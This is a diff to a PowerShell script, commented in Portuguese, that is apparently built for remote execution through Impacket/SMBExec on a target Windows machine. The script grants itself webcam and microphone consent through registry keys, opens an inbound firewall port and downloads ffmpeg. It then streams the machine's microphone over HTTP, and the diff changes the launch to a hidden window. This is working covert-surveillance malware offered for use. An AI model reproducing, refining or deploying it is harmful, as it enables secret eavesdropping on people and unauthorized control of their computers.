@@ -1,14 +1,15 @@
 <#
-Stream Audio/Video - Versao Compativel com Impacket/SMBExec
+Stream Audio Remoto - Versao Estavel
 Repositorio: https://github.com/l0ckz3r0/StreamAudioWin
+Compativel com Impacket / Execucao Remota
 #>
 
-# === CONFIGURACAO ===
+# === CONFIGURACOES ===
 $port = 8080
 $ffmpegPath = "C:\ffmpeg\bin\ffmpeg.exe"
 $ffmpegUrl = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
 
-# === PERMISSOES E FIREWALL ===
+# === PERMISSOES E REGRAS DE FIREWALL ===
 function Set-Permissions {
     $paths = @(
         "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam",
@@ -24,7 +25,7 @@ function Set-Permissions {
     New-NetFirewallRule -Name "StreamAV" -DisplayName "Stream AV" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow -Enabled True | Out-Null
 }
 
-# === INSTALACAO DO FFMPEG ===
+# === INSTALACAO AUTOMATICA DO FFMPEG ===
 function Install-Ffmpeg {
     if (Test-Path $ffmpegPath) { return }
     $tmpZip = "$env:TEMP\ffmpeg.zip"
@@ -48,25 +49,21 @@ function Get-MyIP {
     return $ip
 }
 
-# === EXECUCAO PRINCIPAL ===
+# === INICIAR TRANSMISSAO ===
 Clear-Host
 Write-Host "==========================================="
-Write-Host "      STREAM AUDIO / VIDEO"
+Write-Host "    STREAM AUDIO REMOTO ATIVO"
 Write-Host "==========================================="
 
 Set-Permissions
 Install-Ffmpeg
 $myIP = Get-MyIP
 
-Write-Host "`nIniciando transmissao..."
-
-# Usa identificador tecnico direto do microfone que ja funcionou antes
-$cmd = "`"$ffmpegPath`" -y -f dshow -rtbufsize 2M -i audio=`"@device_cm_{33D9A762-90C8-11D0-BD43-00A0C911CE86}\wave_{49D00171-596A-469A-9582-F9E720EA5E4F}`" -acodec mp3 -b:a 64k -ar 22050 -ac 1 -f mp3 -listen 1 `"http://0.0.0.0:$port/stream`""
-
-Write-Host "`n==========================================="
-Write-Host "TRANSMISSAO ATIVA"
-Write-Host "Acesso via VLC: http://$myIP`:$port/stream"
+Write-Host "`nAcesso via VLC: http://$myIP`:$port/stream"
 Write-Host "==========================================="
 
-# Executa sem gerar erros de variaveis vazias
-& cmd /c $cmd
+# Comando otimizado: buffer maior, formato leve e estavel
+$cmd = "`"$ffmpegPath`" -y -f dshow -rtbufsize 16M -i audio=`"@device_cm_{33D9A762-90C8-11D0-BD43-00A0C911CE86}\wave_{49D00171-596A-469A-9582-F9E720EA5E4F}`" -acodec libmp3lame -b:a 48k -ar 16000 -ac 1 -f mp3 -listen 1 -reconnect 1 -reconnect_at_eof 1 -nostdin `"http://0.0.0.0:$port/stream`""
+
+# Executa sem travar a sessao
+Start-Process -FilePath cmd.exe -ArgumentList "/c $cmd" -WindowStyle Hidden
